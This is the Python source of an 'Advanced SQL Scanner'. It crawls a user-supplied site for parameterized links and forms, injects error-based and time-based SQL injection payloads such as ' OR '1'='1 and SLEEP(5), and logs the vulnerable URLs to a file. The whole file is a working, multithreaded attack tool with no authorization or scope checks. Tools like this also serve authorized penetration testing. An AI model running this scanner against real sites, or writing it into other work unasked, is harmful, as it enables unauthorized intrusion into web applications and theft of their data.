import re
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import time
import threading

# Console colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

# Payloads
basic_payloads = ["'", "' OR '1'='1", "'--", "\"", "\" OR \"1\"=\"1", "\"--"]
time_payloads = ["'; WAITFOR DELAY '0:0:5'--", "' OR SLEEP(5)--"]
boolean_payloads = [
    ("' AND 1=1 --", True),
    ("' AND 1=2 --", False),
]
error_signatures = ["sql syntax", "unclosed quotation", "mysql_fetch", "odbc", "ORA-"]

# Headers
default_headers = {
    "User-Agent": "Mozilla/5.0 (SQLScanner)",
    "Accept": "text/html",
}

# Banner
def banner():
    print(CYAN + r"""
   _____  ____  _         _____       _           _   _             
  / ____|/ __ \| |       |_   _|     (_)         | | (_)            
 | (___ | |  | | |         | |  _ __  _  ___  ___| |_ _  ___  _ __  
  \___ \| |  | | |         | | | '_ \| |/ _ \/ __| __| |/ _ \| '_ \ 
  ____) | |__| | |____    _| |_| | | | |  __/ (__| |_| | (_) | | | |
 |_____/ \___\_\______|  |_____|_| |_| |\___|\___|\__|_|\___/|_| |_|
                                    _/ |                            
                                   |__/     (Advanced SQL Scanner)
    """ + RESET)

# Crawl for parameterized links
def crawl_links(url):
    links = set()
    try:
        res = requests.get(url, headers=default_headers, timeout=5)
        soup = BeautifulSoup(res.text, "html.parser")
        for tag in soup.find_all('a', href=True):
            full_url = urljoin(url, tag['href'])
            if '=' in full_url:
                links.add(full_url)
    except:
        pass
    return list(links)

# Detect form and generate POST data
def detect_forms(url):
    forms = []
    try:
        res = requests.get(url, headers=default_headers, timeout=5)
        soup = BeautifulSoup(res.text, "html.parser")
        for form in soup.find_all("form"):
            details = {}
            action = form.attrs.get("action", url)
            method = form.attrs.get("method", "get").lower()
            inputs = []
            for input_tag in form.find_all("input"):
                name = input_tag.attrs.get("name")
                value = input_tag.attrs.get("value", "test")
                if name:
                    inputs.append((name, value))
            details['action'] = urljoin(url, action)
            details['method'] = method
            details['inputs'] = inputs
            forms.append(details)
    except:
        pass
    return forms

# Check for SQL Injection
def test_injection(url, method="get", data=None):
    results = []
    target = url
    if method == "get":
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        for param in query:
            original = query[param][0]
            for payload in basic_payloads + time_payloads:
                query[param][0] = original + payload
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(query, doseq=True)}"
                try:
                    r = requests.get(test_url, headers=default_headers, timeout=8)
                    if any(err in r.text.lower() for err in error_signatures):
                        results.append((payload, test_url, "Error-based"))
                    if r.elapsed.total_seconds() > 4.5 and payload in time_payloads:
                        results.append((payload, test_url, "Time-based"))
                except:
                    continue
    elif method == "post":
        for name, value in data.items():
            for payload in basic_payloads + time_payloads:
                temp_data = data.copy()
                temp_data[name] = value + payload
                try:
                    r = requests.post(url, headers=default_headers, data=temp_data, timeout=8)
                    if any(err in r.text.lower() for err in error_signatures):
                        results.append((payload, url, "Error-based (POST)"))
                    if r.elapsed.total_seconds() > 4.5 and payload in time_payloads:
                        results.append((payload, url, "Time-based (POST)"))
                except:
                    continue
    return results

# Scan a single target
def scan_target(url):
    print(f"{YELLOW}[>>>] Scanning: {url}{RESET}")
    detect_headers(url)
    findings = test_injection(url)
    for payload, link, typ in findings:
        print(f"{GREEN}[+] Found: {link} | Payload: {repr(payload)} | Type: {typ}{RESET}")
        with open(output_file, 'a') as f:
            f.write(f"Payload: {repr(payload)} | URL: {link} | Type: {typ}\n")

# Detect headers
def detect_headers(url):
    try:
        res = requests.get(url, headers=default_headers, timeout=5)
        print(f"{CYAN}[INFO] Server: {res.headers.get('Server', 'Unknown')}")
        print(f"[INFO] X-Powered-By: {res.headers.get('X-Powered-By', 'Unknown')}{RESET}")
    except:
        print(f"{YELLOW}[!] Could not detect headers.{RESET}")

# Main scan function
def scan(url):
    links = [url] if '=' in url else crawl_links(url)
    print(f"{CYAN}[*] Found {len(links)} parameterized link(s).{RESET}")
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    global output_file
    output_file = f"sqlscan_results_{timestamp}.txt"
    with open(output_file, 'w') as f:
        f.write("Payload | URL | Type\n")
        f.write("=" * 80 + "\n")

    threads = []
    for link in links:
        t = threading.Thread(target=scan_target, args=(link,))
        t.start()
        threads.append(t)

    # Form detection
    print(f"{CYAN}\n[*] Checking forms on {url}...{RESET}")
    forms = detect_forms(url)
    for form in forms:
        data = {name: val for name, val in form['inputs']}
        results = test_injection(form['action'], method=form['method'], data=data)
        for payload, link, typ in results:
            print(f"{GREEN}[+] Found: {link} | Payload: {repr(payload)} | Type: {typ}{RESET}")
            with open(output_file, 'a') as f:
                f.write(f"Payload: {repr(payload)} | URL: {link} | Type: {typ}\n")

    for t in threads:
        t.join()

    print(f"\n✅ Scan complete. Results saved in: {output_file}")

# Entry
if __name__ == "__main__":
    banner()
    target = input("[?] Enter target URL (with or without parameters): ").strip()
    scan(target)
